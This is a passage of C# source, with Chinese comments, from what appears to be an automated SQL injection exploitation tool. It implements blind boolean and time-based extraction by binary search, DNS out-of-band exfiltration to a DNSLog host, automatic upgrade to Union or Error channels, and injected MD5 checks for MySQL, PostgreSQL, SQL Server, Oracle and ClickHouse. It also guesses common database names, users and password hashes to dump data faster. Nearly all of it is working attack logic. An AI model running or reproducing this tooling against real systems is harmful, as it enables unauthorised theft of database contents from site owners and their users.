                list = inHigh ? highGroup : list.Skip(cut + 1).ToList();
            }
            int result = list[0];
            _charFreqObserved.AddOrUpdate(result, 1, (_, c) => c + 1);
            //信任度自适应：真实值在模型分布内（模型猜对方向）提升信任，落空衰减
            if (dist != null)
            {
                bool hit = dist.ContainsKey(result) || (result >= 'A' && result <= 'Z' && dist.ContainsKey(result + 32));
                _ngramTrust = Math.Clamp(_ngramTrust * (hit ? 1.06 : 0.85), 0.25, 1.0);
            }
            return result;
        }

        /// <summary>ASCII字符频率二分（1~127）：替代固定7次均匀二分，典型内容≈4.5~5次/字符；prefix融入n-gram模型概率</summary>
        private static async Task<int> GetBoolValueAsciiFreq(AppConfig config, string payload, string? prefix = null)
        {
            return await GetBoolValueFreq(config, payload, AsciiRangeCache, prefix).ConfigureAwait(false);
        }
        private static readonly List<int> AsciiRangeCache = Enumerable.Range(1, 127).ToList();

        /// <summary>
        /// 二分法判断
        /// </summary>
        /// <param name="payLoadStr">获取数据paylaod</param>
        /// <param name="start">开始值</param>
        /// <param name="end">最大值</param>
        /// <returns></returns>
        public static async Task<int> GetDataLen(AppConfig config, string payload, int start, int end)
        {

            int low = start;
            int high = end;
            int result = 0;
            while (low <= high)
            {
                config.CheckStop();
                //int mid = MyTools.getLargeNum(low, high);
                int mid = (low + high) / 2;
               HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
                request.NullBodyHint = NullBodyCapable(config);
                request.Payload = WrapSleepCondition(config, payload.Replace("{len}", mid+"", StringComparison.Ordinal));
                HttpResponse response = await SendBoolGuarded(config, request).ConfigureAwait(false);
                bool exists = await JudgeBoolAsync(config, request, response);


                if (exists)
                {
                    result = mid;
                    // ASCII值大于mid，缩小左边界
                    low = mid + 1;
                }
                else
                {
                    // ASCII值小于等于mid，缩小右边界
                    high = mid - 1;
                }
            }

            return result;

        }

        public static async Task<int> GetValueLen(AppConfig config, string payload, int start, int end)
        {
            //DNS盲注类型：count类标量也走DNS外带取回再解析（避免逐位布尔猜解）
            if (config.DataConfig.SelectedInjectType == InjectType.Dns)
            {
                string val = await GetStringByDns(config, "(" + payload + ")").ConfigureAwait(false);
                return int.TryParse(val?.Trim(), out int n) ? n : 0;
            }
            return await GetBoolValue(config, payload, start, end).ConfigureAwait(false);
        }

        /// <summary>
        /// DNS盲注取标量值：DNS外带触发 + DNSLog平台自动回收拼接。
        /// 前置条件：网络设置中配置了DNSLog域名（自动回收还需API Token/地址）；
        /// payload经注入点盲注通道携带执行，需已配置该点的盲注判断值（CheckValue）。
        /// </summary>
        public static async Task<string> GetStringByDns(AppConfig config, string expr, int maxLen = 192)
        {
            if (string.IsNullOrWhiteSpace(config.DataConfig.DnsLogDomain))
            {
                Log.Warning("DNS盲注需要先在网络设置中配置DNSLog域名（如 abc.ceye.io）！");
                return "";
            }
            if (!DbCapabilities.HasDnsChannel(config.DataConfig.SelectedDBType))
            {
                Log.Warning("数据库类型 " + config.DataConfig.SelectedDBType + " 不支持DNS外带取数！");
                return "";
            }
            if (string.IsNullOrWhiteSpace(config.DataConfig.CheckValue))
            {
                Log.Warning("DNS盲注的payload需经注入点盲注通道携带执行，请先配置该点的盲注判断值（或恢复对应盲注注入记录）！");
                return "";
            }
            //按目标长度估算外带段数（每段SegLen个hex字符=SegLen/2字节），上限256段防跑飞
            int maxChunks = Math.Clamp((maxLen * 2 + DnsExfilTool.SegLen - 1) / DnsExfilTool.SegLen, 1, 256);
            int sent = await DnsExfilTool.SendDnsExfil(config, expr, maxChunks).ConfigureAwait(false);
            if (sent <= 0)
            {
                return "";
            }
            //配置了API Token则自动轮询回收，否则提示人工到平台拼接
            string data = await DnsExfilTool.CollectFromDnsLog(config, sent).ConfigureAwait(false);
            return data ?? "";
        }


        /// <summary>
        /// 延时盲注时，将条件包装为sleep延时payload（仅支持的数据库有效，否则原样返回）。
        /// where=3参数替换vector模式：延时机制由vector模板自带（如ELT([INFERENCE],SLEEP(5))），
        /// 条件需原样进[INFERENCE]槽位，再包sleep会双重延时且改变vector语义，故跳过包装
        /// </summary>
        private static string WrapSleepCondition(AppConfig config, string condition)
        {
            if (config.DataConfig.IsVectorMode)
            {
                return condition;
            }
            if (!config.DataConfig.EffectiveBoolType.Equals(BoolInjectType.Time))
            {
                return condition;
            }
            string sleepTemplate = PayloadFactory.BasePayload.SleepBoolData;
            if (string.IsNullOrEmpty(sleepTemplate))
            {
                //无延时模板的库（DB2/H2/Access等无sleep函数）：明确提示一次而不是静默发裸条件导致永远判假、取数为空
                MarkSleepUnsupported(config.DataConfig.SelectedDBType);
                return condition;
            }
            int maxTime = MyTools.ConvertToInt(config.DataConfig.CheckValue);
            if (maxTime <= 0)
            {
                maxTime = config.SleepInjectMaxTime;
            }
            return TemplateRenderer.Render(sleepTemplate, ("cond", condition), ("sleep", maxTime), ("alias", MyTools.RandStr(6)));
        }

        /// <summary>本次运行已提示过"不支持时间盲注"的库（避免每请求刷日志）</summary>
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<DBType, bool> _sleepUnsupportedWarned = new();

        private static void MarkSleepUnsupported(DBType db)
        {
            if (_sleepUnsupportedWarned.TryAdd(db, true))
            {
                Log.Warning("数据库 " + db + " 无延时函数模板（SleepBoolData），不支持时间盲注取数！请改用Union/报错/布尔盲注通道。");
            }
        }

        /// <summary>
        /// 通用布尔条件判断：发送原始条件payload并按当前判断方式（关键字/时间/正则/长度）判定真假。
        /// 供Access字典猜解（exists子查询）等存在性判断场景使用
        /// </summary>
        public static async Task<bool> CheckCondition(AppConfig config, string condition)
        {
            HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
            request.NullBodyHint = NullBodyCapable(config);
            request.Payload = WrapSleepCondition(config, condition);
            HttpResponse response = await SendBoolGuarded(config, request).ConfigureAwait(false);
            return await JudgeBoolAsync(config, request, response);
        }

        /// <summary>
        /// 盲注方式获取字符串值入口：DNS类型走外带通道；Blind/Time类型依次经过：
        /// 通道自动升级（同参数Union/Error可用则切换，数量级提速）→ 持久值缓存（跨会话复用结构类取值）→
        /// 低基数整值猜测 → 常见值字典预测 → 逐字符读取 → MD5/CRC整串校验（防脏）→ 会话学习回写
        /// </summary>
        public static async Task<string?> GetStringByBool(AppConfig config, string dataPayload, int maxLen)
        {
            //DNS盲注类型：取数改走DNS外带通道（payload仍经注入点盲注通道携带执行）
            if (config.DataConfig.SelectedInjectType == InjectType.Dns)
            {
                return await GetStringByDns(config, dataPayload, maxLen).ConfigureAwait(false);
            }
            bool lowCardable = config.DataConfig.SelectedInjectType == InjectType.Blind
                || config.DataConfig.SelectedInjectType == InjectType.Time;
            //取数自动通道升级：盲注/时间通道取数前探测同参数Union/Error通道，可用则切换（每注入点会话只探一次）
            if (lowCardable && config.DataConfig.ChannelUpgrade)
            {
                string? upgraded = await TryUpgradeChannel(config, dataPayload, maxLen).ConfigureAwait(false);
                if (upgraded != null)
                {
                    return upgraded;
                }
                //升级后本次读取已由快通道完成；未升级则继续盲注链路
            }
            if (lowCardable)
            {
                //跨会话值缓存：结构类取值（库/表/列/版本/用户）命中直接返回（仅元数据类payload缓存，行数据不缓存防脏读）
                string? cached = ValueCacheGet(config, dataPayload);
                if (cached != null)
                {
                    //缓存校验（默认开）：命中后先发1次整值等值探测确认目标值未变化，
                    //变了说明库结构已更新——剔除陈旧缓存并落回下方全量重读（读完后自动回写新值）
                    if (config.DataConfig.ValueCacheVerify)
                    {
                        if (await ValueCacheVerifyHit(config, dataPayload, cached).ConfigureAwait(false))
                        {
                            Log.SysLog("值缓存命中（校验通过，1次请求）：" + cached);
                            return cached;
                        }
                        Log.Warning("值缓存已过期（目标值变化）：旧值=" + cached + "，剔除并重读");
                        ValueCacheRemove(config, dataPayload);
                    }
                    else
                    {
                        Log.SysLog("值缓存命中（跨会话复用）：" + cached);
                        return cached;
                    }
                }
                string? guess = await TryLowCardinalGuess(config, dataPayload).ConfigureAwait(false);
                if (guess != null)
                {
                    return guess;
                }
                //常见值字典预测（predict-output 能力）：库/表/列/用户名等常见值按同长候选整值等值探测，
                //命中1次请求整串收工；未命中走逐字符读取（长度探测结果已缓存，不会重复读长度）
                if (config.DataConfig.PredictOutput)
                {
                    string? predicted = await TryPredictOutput(config, dataPayload, maxLen).ConfigureAwait(false);
                    if (predicted != null)
                    {
                        RecordLowCardinal(config, dataPayload, predicted);
                        CommonOutputPredictor.Learn(CommonOutputPredictor.InferSection(dataPayload), predicted);
                        if (config.DataConfig.NgramOnlineLearn)
                        {
                            NgramCharModel.Learn(predicted);
                        }
                        ValueCachePut(config, dataPayload, predicted);
                        return predicted;
                    }
                }
            }
            string? result = await GetStringByBoolInner(config, dataPayload, maxLen).ConfigureAwait(false);
            if (lowCardable)
            {
                //MD5整串校验（防脏数据升级：1次请求验证整串，失败则清缓存重读一次）
                if (config.DataConfig.DirtyDataGuard && !string.IsNullOrEmpty(result))
                {
                    result = await HashVerifyOrReread(config, dataPayload, result, maxLen).ConfigureAwait(false);
                }
                RecordLowCardinal(config, dataPayload, result);
                CommonOutputPredictor.Learn(CommonOutputPredictor.InferSection(dataPayload), result);
                if (config.DataConfig.NgramOnlineLearn)
                {
                    NgramCharModel.Learn(result);
                }
                ValueCachePut(config, dataPayload, result);
            }
            return result;
        }

        //---------------- 取数自动通道升级（盲注→Union/Error，数量级提速）----------------
        //检测后同参数往往同时检出Union/Error/Blind多条记录。盲注/时间取数前花1次请求探测
        //同参数Union/Error通道当前是否可用，可用则把本次读取直接路由到快通道，并提示用户切换注入记录。
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, InjectRecord> _upgradeCache
            = new System.Collections.Concurrent.ConcurrentDictionary<string, InjectRecord>();
        /// <summary>无快通道哨兵（ConcurrentDictionary不允许null值）</summary>
        private static readonly InjectRecord _noFastChannel = new InjectRecord();

        /// <summary>
        /// 通道升级取值（FileCmdTools等工具类复用入口）：同参数存在可用Union/Error记录时本次读取直接走快通道；
        /// 无快通道/探测失败返回null，调用方继续原盲注链路。探测结果按 目标+参数 缓存（成功/失败都只探一次）
        /// </summary>
        public static async Task<string?> TryUpgradeFetch(AppConfig config, string dataPayload, int maxLen)
        {
            return await TryUpgradeChannel(config, dataPayload, maxLen).ConfigureAwait(false);
        }

        /// <summary>
        /// 尝试通道升级：返回非null=已由快通道完成本次读取；null=无快通道/探测失败，继续盲注链路。
        /// 探测结果按 目标+参数 缓存（成功/失败都只探一次）
        /// </summary>
        private static async Task<string?> TryUpgradeChannel(AppConfig config, string dataPayload, int maxLen)
        {
            string key = config.Host + ":" + config.Port + "|" + config.DataConfig.InjectParamName;
            if (_upgradeCache.TryGetValue(key, out InjectRecord? rec) && ReferenceEquals(rec, _noFastChannel))
            {
                return null;   //本注入点已探过且无快通道
            }
            if (rec == null)
            {
                rec = InjectChannelRegistry.FindFasterChannel(config.Host, config.Port,
                    config.DataConfig.InjectParamName, config.DataConfig.SelectedInjectType);
                if (rec == null)
                {
                    _upgradeCache[key] = _noFastChannel;
                    return null;
                }
                //探测快通道当前可用性：发marker按对应通道解析，成功才采纳
                bool ok = await ProbeFastChannel(config, rec).ConfigureAwait(false);
                if (!ok)
                {
                    _upgradeCache[key] = _noFastChannel;
                    return null;
                }
                _upgradeCache[key] = rec;
                Log.Success("通道自动升级：检测到同参数存在可用的 " + rec.InjectType + " 通道（"
                    + config.DataConfig.SelectedInjectType + "→" + rec.InjectType + "），本次取数走快通道！");
            }
            //用快通道记录完成本次读取（临时切换配置，读完恢复盲注上下文）
            var dc = config.DataConfig;
            var oldType = dc.SelectedInjectType; var oldBool = dc.SelectBoolInject;
            var oldReq = config.RequestTxt; var oldCols = dc.SumColumnCount; var oldShow = dc.ShowColumnIndex;
            try
            {
                dc.SelectedInjectType = rec.InjectType;
                if (!string.IsNullOrEmpty(rec.RequestTxt))
                {
                    config.RequestTxt = rec.RequestTxt;
                }
                dc.SumColumnCount = rec.SumColumnCount;
                dc.ShowColumnIndex = rec.ShowColumnIndex;
                string data = rec.InjectType == InjectType.Union
                    ? await DataDumpWithNoFrom(config, dataPayload).ConfigureAwait(false)
                    : await DataDumpWithError(config, dataPayload).ConfigureAwait(false);
                return data ?? "";
            }
            catch
            {
                //快通道读取异常：作废升级缓存，回退盲注
                _upgradeCache.TryRemove(key, out _);
                return null;
            }
            finally
            {
                dc.SelectedInjectType = oldType; dc.SelectBoolInject = oldBool;
                config.RequestTxt = oldReq; dc.SumColumnCount = oldCols; dc.ShowColumnIndex = oldShow;
            }
        }

        /// <summary>探测Union/Error通道可用性：发带随机marker的取值，解析结果含marker即通道可用</summary>
        private static async Task<bool> ProbeFastChannel(AppConfig config, InjectRecord rec)
        {
            var dc = config.DataConfig;
            var oldType = dc.SelectedInjectType;
            var oldReq = config.RequestTxt; var oldCols = dc.SumColumnCount; var oldShow = dc.ShowColumnIndex;
            try
            {
                dc.SelectedInjectType = rec.InjectType;
                if (!string.IsNullOrEmpty(rec.RequestTxt))
                {
                    config.RequestTxt = rec.RequestTxt;
                }
                dc.SumColumnCount = rec.SumColumnCount;
                dc.ShowColumnIndex = rec.ShowColumnIndex;
                string marker = "qz" + MyTools.RandStr(6).ToLower();
                string data = rec.InjectType == InjectType.Union
                    ? await DataDumpWithNoFrom(config, "'" + marker + "'").ConfigureAwait(false)
                    : await DataDumpWithError(config, "'" + marker + "'").ConfigureAwait(false);
                return data != null && data.Contains(marker, StringComparison.Ordinal);
            }
            catch
            {
                return false;
            }
            finally
            {
                dc.SelectedInjectType = oldType;
                config.RequestTxt = oldReq; dc.SumColumnCount = oldCols; dc.ShowColumnIndex = oldShow;
            }
        }

        //---------------- 跨会话值缓存（结构类取值持久化复用）----------------
        //仅缓存元数据类payload（InferSection可识别：库/表/列/版本/用户等），行数据不缓存防脏读。
        //键=SHA1(目标+库类型+payload)，跨进程持久化 config/sessions/value_cache.json
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, string> _valueCache
            = new System.Collections.Concurrent.ConcurrentDictionary<string, string>();
        private static bool _valueCacheLoaded = false;
        private static readonly object _valueCacheLock = new object();
        /// <summary>脏计数批量落盘：每攒够 ValueCacheSaveEvery 条新值才全量写盘一次（读一张50列的表从50次IO降到约3次）</summary>
        private static int _valueCacheDirty = 0;
        private const int ValueCacheSaveEvery = 20;
        private static string ValueCachePath => "config/sessions/value_cache.json";

        private static void ValueCacheEnsureLoaded()
        {
            if (_valueCacheLoaded)
            {
                return;
            }
            lock (_valueCacheLock)
            {
                if (_valueCacheLoaded)
                {
                    return;
                }
                try
                {
                    if (System.IO.File.Exists(ValueCachePath))
                    {
                        var dic = System.Text.Json.JsonSerializer.Deserialize(
                            System.IO.File.ReadAllText(ValueCachePath), Source.JsonCtx.CompactInfo<Dictionary<string, string>>());
                        if (dic != null)
                        {
                            foreach (var kv in dic)
                            {
                                _valueCache[kv.Key] = kv.Value;
                            }
                            Log.SysLog("跨会话值缓存已加载：" + dic.Count + " 条（" + ValueCachePath + "）");
                        }
                    }
                }
                catch (Exception ex) { Log.SysLog("跨会话值缓存已加载异常：" + ex.Message); }
                _valueCacheLoaded = true;
                //进程退出兜底落盘（批量写盘未攒够阈值时不丢尾部数据）
                AppDomain.CurrentDomain.ProcessExit += (_, _) => ValueCacheSave();
            }
        }

        private static string ValueCacheKey(AppConfig config, string dataPayload)
        {
            string raw = config.Host + ":" + config.Port + "|" + config.DataConfig.SelectedDBType + "|" + dataPayload;
            return Convert.ToHexString(System.Security.Cryptography.SHA1.HashData(Encoding.UTF8.GetBytes(raw)));
        }

        /// <summary>仅结构类payload参与缓存（版本/库/表/列/用户等元数据），返回null=未命中或不该缓存</summary>
        private static string? ValueCacheGet(AppConfig config, string dataPayload)
        {
            if (!config.DataConfig.ValueCache || CommonOutputPredictor.InferSection(dataPayload) == null)
            {
                return null;
            }
            ValueCacheEnsureLoaded();
            return _valueCache.TryGetValue(ValueCacheKey(config, dataPayload), out string? v) ? v : null;
        }

        private static void ValueCachePut(AppConfig config, string dataPayload, string? value)
        {
            if (!config.DataConfig.ValueCache || string.IsNullOrEmpty(value)
                || CommonOutputPredictor.InferSection(dataPayload) == null)
            {
                return;
            }
            ValueCacheEnsureLoaded();
            _valueCache[ValueCacheKey(config, dataPayload)] = value;
            //批量落盘：攒够阈值才写盘（剔除操作 ValueCacheRemove 保持即时落盘，属低频）
            if (System.Threading.Interlocked.Increment(ref _valueCacheDirty) >= ValueCacheSaveEvery)
            {
                ValueCacheSave();
            }
        }

        /// <summary>缓存命中校验：按当前库Cast模板包装后做整值等值探测（盲注/Union/Error三通道共用；NoCast开启时不包装）</summary>
        private static async Task<bool> ValueCacheVerifyHit(AppConfig config, string dataPayload, string cached)
        {
            return await PredictEqualCheck(config, CastWrapIfNeeded(config, dataPayload), cached).ConfigureAwait(false);
        }

        /// <summary>移除缓存条目（校验发现目标值已变化时剔除陈旧值），并持久化</summary>
        private static void ValueCacheRemove(AppConfig config, string dataPayload)
        {
            ValueCacheEnsureLoaded();
            if (_valueCache.TryRemove(ValueCacheKey(config, dataPayload), out _))
            {
                //剔除属低频但需即时生效：置脏确保ValueCacheSave不被“无脏跳过”拦截
                System.Threading.Interlocked.CompareExchange(ref _valueCacheDirty, 1, 0);
                ValueCacheSave();
            }
        }

        private static void ValueCacheSave()
        {
            if (System.Threading.Interlocked.Exchange(ref _valueCacheDirty, 0) == 0 && _valueCacheLoaded)
            {
                return;   //无脏数据不写盘（ProcessExit兜底调用时常见）
            }
            try
            {
                lock (_valueCacheLock)
                {
                    System.IO.Directory.CreateDirectory(System.IO.Path.GetDirectoryName(ValueCachePath)!);
                    string tmp = ValueCachePath + ".tmp";
                    System.IO.File.WriteAllText(tmp,
                        System.Text.Json.JsonSerializer.Serialize(new Dictionary<string, string>(_valueCache), Source.JsonCtx.CompactInfo<Dictionary<string, string>>()));
                    System.IO.File.Copy(tmp, ValueCachePath, true);
                    System.IO.File.Delete(tmp);
                }
            }
            catch { }
        }

        //---------------- MD5/CRC 整串校验（防脏数据升级：1次请求验证整串，替代时间通道逐字符复核）----------------
        //整串读完后发 (case when md5(表达式)='本地计算值' then 1 else 0 end)>0 验证，失败说明二分读到脏数据，
        //清长度/断点缓存重读一次，仍失败告警。仅纯ASCII值启用（多字节编码与DB字符集相关，本地算不准）。
        //能力探测按 目标+库 缓存一次：md5('a')='0cc175b9c0f1b6a831c399e269772661'
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, bool> _hashCapable
            = new System.Collections.Concurrent.ConcurrentDictionary<string, bool>();

        /// <summary>各库MD5校验表达式（{0}=取值表达式，{1}=期望值小写hex）；不支持的库返回null</summary>
        private static string? HashVerifyExpr(DBType dbType, string expr)
        {
            return dbType switch
            {
                DBType.MySQL => "md5(" + expr + ")",
                DBType.PostgreSQL or DBType.OpenGauss or DBType.Kingbase => "md5(cast((" + expr + ") as text))",
                DBType.SQLServer => "lower(sys.fn_varbintohexstr(hashbytes('MD5', cast((" + expr + ") as varchar(max)))))",
                DBType.ClickHouse => "lower(hex(MD5(" + expr + ")))",
                //Oracle 12c+（无权限/低版本能力探测会自动判不可用）
                DBType.Oracle => "lower(standard_hash(" + expr + ",'MD5'))",
                _ => null
            };
        }

        private static string Md5Hex(string s)
        {
            return Convert.ToHexStringLower(System.Security.Cryptography.MD5.HashData(Encoding.UTF8.GetBytes(s)));
        }

        /// <summary>目标是否支持MD5整串校验（能力探测缓存到 目标+库；不支持/探测失败=false）</summary>
        private static async Task<bool> HashVerifyCapable(AppConfig config)
        {
            string key = config.Host + ":" + config.Port + "|" + config.DataConfig.SelectedDBType;
            if (_hashCapable.TryGetValue(key, out bool cap))
            {
                return cap;
            }
            bool ok = false;
            try
            {
                string? expr = HashVerifyExpr(config.DataConfig.SelectedDBType, "'a'");
                if (expr != null)
                {
                    string cond = "(case when (" + expr + ")='" + Md5Hex("a") + "' then 1 else 0 end)";
                    ok = await ProbeBool(config, cond, 0).ConfigureAwait(false);
                }
            }
            catch (Exception ex) { Log.SysLog("MD5校验能力探测异常：" + ex.Message); }
            _hashCapable[key] = ok;
            return ok;
        }

        /// <summary>时间通道逐字符复核是否可省略：MD5整串校验可用时，逐字符复核降级为整串1次校验（每值省N-1次探测）</summary>
        public static bool HashVerifyAvailableCached(AppConfig config)
        {
            string key = config.Host + ":" + config.Port + "|" + config.DataConfig.SelectedDBType;
            return _hashCapable.TryGetValue(key, out bool cap) && cap;
        }

        /// <summary>整串MD5校验：失败清缓存重读一次，仍失败告警并返回重读值（校验仅对纯ASCII值启用）</summary>
        private static async Task<string?> HashVerifyOrReread(AppConfig config, string dataPayload, string value, int maxLen)
        {
            if (value.Length < 8 || value.Any(c => c >= 128))
            {
                return value;   //短值读取本来就便宜，多字节值本地MD5算不准，跳过
            }
            if (!await HashVerifyCapable(config).ConfigureAwait(false))
            {
                return value;
            }
            string casted = string.IsNullOrEmpty(PayloadFactory.BasePayload.Cast)
                ? dataPayload
                : TemplateRenderer.Render(PayloadFactory.BasePayload.Cast, ("expr", dataPayload));
            string? expr = HashVerifyExpr(config.DataConfig.SelectedDBType, casted);
            string cond = "(case when (" + expr + ")='" + Md5Hex(value) + "' then 1 else 0 end)";
            if (await ProbeBool(config, cond, 0).ConfigureAwait(false))
            {
                return value;   //整串校验通过
            }
            Log.Warning("MD5整串校验未通过（读到值与库中不符），清除缓存重读该值……");
            //作废该值的长度/断点/预测缓存后重读一次
            string lenKey = config.Host + ":" + config.Port + "|" + PayloadFactory.BPTool.DataLen(casted);
            _lenCache.TryRemove(lenKey, out _);
            _blindProgress.TryRemove(ScopeKey(config, dataPayload ?? ""), out _);
            string? reread = await GetStringByBoolInner(config, dataPayload ?? "", maxLen).ConfigureAwait(false);
            string cond2 = "(case when (" + expr + ")='" + Md5Hex(reread ?? "") + "' then 1 else 0 end)";
            if (!string.IsNullOrEmpty(reread) && reread.All(c => c < 128)
                && await ProbeBool(config, cond2, 0).ConfigureAwait(false))
            {
                return reread;
            }
            Log.Warning("MD5整串校验重读仍未通过，目标页面可能动态性过强，结果可能不准：" + reread);
            return reread;
        }

        //---------------- 低基数整值猜测（低基数推断）----------------
        //dump行数据时按列缓存已读值频次：某列distinct值少（≤阈值）且有重复值时，读新单元格先按频次降序
        //整值等值探测，命中1次请求收工；等值探测是数据库真值判断，猜错只是多1次请求，不会取错数据。
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, System.Collections.Concurrent.ConcurrentDictionary<string, int>> _lowCardStats
            = new System.Collections.Concurrent.ConcurrentDictionary<string, System.Collections.Concurrent.ConcurrentDictionary<string, int>>();
        private const int LowCardDistinctThreshold = 20;   //distinct值数上限（超过冻结该列猜测）
        private const int LowCardMaxCandidates = 8;        //单单元格最多尝试候选数
        private const int LowCardMaxValueLen = 255;        //参与整值比较的值长度上限

        /// <summary>列候选键：库类型+payload抹掉数字（行偏移/limit/where数值），同列跨行共享候选</summary>
        private static string LowCardKey(AppConfig config, string dataPayload)
        {
            string norm = DigitRunRegex().Replace(dataPayload, "#");
            return config.DataConfig.SelectedDBType + "|" + norm;
        }

        /// <summary>低基数整值猜测：命中返回候选值（时间盲注做NOT反向复核防静态超时页误判），未命中返回null</summary>
        private static async Task<string?> TryLowCardinalGuess(AppConfig config, string dataPayload)
        {
            string key = LowCardKey(config, dataPayload);
            if (!_lowCardStats.TryGetValue(key, out var stats) || stats.Count == 0 || stats.Count > LowCardDistinctThreshold)
            {
                return null;
            }
            if (stats.Values.Max ()< 2)
            {
                return null;   //无重复值不猜（同样要求有值至少出现2次）
            }
            var candidates = stats.OrderByDescending(kv => kv.Value).Take(LowCardMaxCandidates).Select(kv => kv.Key).ToList();
            for (int idx = 0; idx < candidates.Count; idx++)
            {
                string candidate = candidates[idx];
                string lit = candidate.Replace("'", "''", StringComparison.Ordinal);
                string cond = "(case when (" + dataPayload + ")='" + lit + "' then 1 else 0 end)";
                bool hit = await ProbeBool(config, cond, 0).ConfigureAwait(false);
                if (!hit)
                {
                    continue;
                }
                //时间盲注：NOT等值反向复核（正反都为真=信道静态不可信，放弃该候选）
                if (config.DataConfig.SelectedInjectType == InjectType.Time)
                {
                    string notCond = "(case when (" + dataPayload + ")<>'" + lit + "' then 1 else 0 end)";
                    bool notHit = await ProbeBool(config, notCond, 0).ConfigureAwait(false);
                    if (notHit)
                    {
                        continue;
                    }
                }
                stats.AddOrUpdate(candidate, 1, (_, c) => c + 1);
                Log.SysLog($"低基数整值命中：候选#{idx + 1}（共{candidates.Count}候选），1次请求取值");
                return candidate;
            }
            return null;
        }

        /// <summary>回写候选缓存：仅记录纯ASCII非空值（跳过非ASCII值）</summary>
        private static void RecordLowCardinal(AppConfig config, string dataPayload, string? value)
        {
            if (string.IsNullOrEmpty(value) || value.Length > LowCardMaxValueLen || value.Any(c => c >= 128))
            {
                return;
            }
            string key = LowCardKey(config, dataPayload);
            var stats = _lowCardStats.GetOrAdd(key, _ => new System.Collections.Concurrent.ConcurrentDictionary<string, int>());
            if (stats.Count > LowCardDistinctThreshold && !stats.ContainsKey(value))
            {
                return;   //超阈值冻结新值入缓存（老候选仍可用）
            }
            stats.AddOrUpdate(value, 1, (_, c) => c + 1);
        }

        //---------------- 常见值字典预测（常见值预测）----------------
        //移植 common-outputs.txt 字典：盲注读库名/表名/列名/用户名/密码哈希这类"常见值"时，
        //先读字符长度，按同长过滤字典候选逐发整值等值探测，命中即1次请求整串收工。
        //扩展能力：库标签裁剪/大小写变体/会话学习/命名模式变体/前缀混合过滤/miss记忆。
        //等值探测是数据库真值判断，猜错只是多1次请求不会取错数据；未命中自动回退逐字符读取。

        /// <summary>预测miss记忆（键=payload+长度）：同一payload预测失败过则跳过，断点续传/重复读不再白扔候选探测</summary>
        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, bool> _predictMiss
            = new System.Collections.Concurrent.ConcurrentDictionary<string, bool>();

        /// <summary>按通道的候选数上限：布尔通道探测便宜给8个，时间通道每个候选=1个sleep周期压到3个</summary>
        private static int PredictMaxCandidates(AppConfig config)
        {
            return config.DataConfig.SelectedInjectType == InjectType.Time ? 3 : 8;
        }

        /// <summary>单候选整值等值探测（含时间通道NOT反向复核），命中=true</summary>
        private static async Task<bool> PredictEqualCheck(AppConfig config, string casted, string candidate)
        {
            string lit = candidate.Replace("'", "''", StringComparison.Ordinal);
            string cond = "(case when (" + casted + ")='" + lit + "' then 1 else 0 end)";
            bool hit = await ProbeBool(config, cond, 0).ConfigureAwait(false);
            if (!hit)
            {
                return false;
            }
            //时间盲注：NOT等值反向复核（正反都为真=信道静态不可信，放弃该候选，同低基数猜测）
            if (config.DataConfig.SelectedInjectType == InjectType.Time)
            {
                string notCond = "(case when (" + casted + ")<>'" + lit + "' then 1 else 0 end)";
                if (await ProbeBool(config, notCond, 0).ConfigureAwait(false))
                {
                    return false;
                }
            }
            return true;
        }

        /// <summary>
        /// 常见值整值预测：命中返回预测值，未命中/无法识别分区返回null（长度探测经_lenCache缓存，回退逐字符不重复读长度）。
        /// 流程：长度→候选（学习值+字典库裁剪+大小写变体）→等值探测；候选超上限先读2字符前缀过滤再探测（前缀混合预测）；
        /// Banners分区走子串前缀延伸（版本号场景，对标业界同类工具 commonPattern路径）
        /// </summary>
        private static async Task<string?> TryPredictOutput(AppConfig config, string dataPayload, int maxLen)
        {
            string? section = CommonOutputPredictor.InferSection(dataPayload);
            if (section == null)
            {
                return null;
            }
            //cast成字符再做等值比较（数值列/表达式统一字符语义，与hex路径同规；NoCast开启时跳过，特殊环境防cast失败）
            string casted = CastWrapIfNeeded(config, dataPayload);
            //先读字符长度（结果入_lenCache，后续逐字符路径复用），按同长过滤候选
            string lenPayload = PayloadFactory.BPTool.DataLen(casted);
            int len = await GetLengthAdaptive(config, lenPayload, maxLen).ConfigureAwait(false);
            if (len <= 0)
            {
                return null;
            }
            string missKey = config.Host + ":" + config.Port + "|" + dataPayload + "|" + len;
            if (_predictMiss.ContainsKey(missKey))
            {
                return null;
            }
            DBType dbType = config.DataConfig.SelectedDBType;
            //Banners前缀延伸（版本号：字典多为"8.0."式前缀条目，整值等值不适用）
            if (section == "Banners")
            {
                string? banner = await BannerPrefixRead(config, dataPayload, casted, len, dbType).ConfigureAwait(false);
                if (banner != null)
                {
                    Log.SysLog("版本前缀预测命中：" + banner + "（" + len + "字符，前缀延伸探测）");
                    return banner;
                }
                _predictMiss[missKey] = true;
                return null;
            }
            int cap = PredictMaxCandidates(config);
            List<string> candidates = CommonOutputPredictor.GetCandidates(section, len, dbType, cap);
            //前缀混合预测：候选超上限时先读2字符前缀过滤（这2次探测本来也是逐字符读取的头2个字符成本）
            if (candidates.Count == 0 || CandidatesOverflow(section, len, dbType, cap))
            {
                string? prefix = await ReadPrefixChars(config, dataPayload, Math.Min(2, len)).ConfigureAwait(false);
                if (prefix != null)
                {
                    candidates = CommonOutputPredictor.GetCandidates(section, len, dbType, cap, prefix);
                }
            }
            foreach (string candidate in candidates)
            {
                config.CheckStop();
                if (await PredictEqualCheck(config, casted, candidate).ConfigureAwait(false))
                {
                    Log.SysLog("常见值预测命中[" + section + "]：" + candidate + "（" + len + "字符，整值等值探测收工）");
                    return candidate;
                }
            }
            _predictMiss[missKey] = true;
            return null;
        }

        /// <summary>同长候选（含变体）是否超出通道上限（超出说明直接截断会丢候选，先做前缀过滤更划算）</summary>
        private static bool CandidatesOverflow(string section, int len, DBType dbType, int cap)
        {
            return CommonOutputPredictor.GetCandidates(section, len, dbType, cap * 3).Count > cap;
        }

        /// <summary>读前n个字符（前缀混合预测用；泛用BoolDataValue模板+ASCII频率二分，前缀均为ASCII场景）</summary>
        private static async Task<string?> ReadPrefixChars(AppConfig config, string dataPayload, int n)
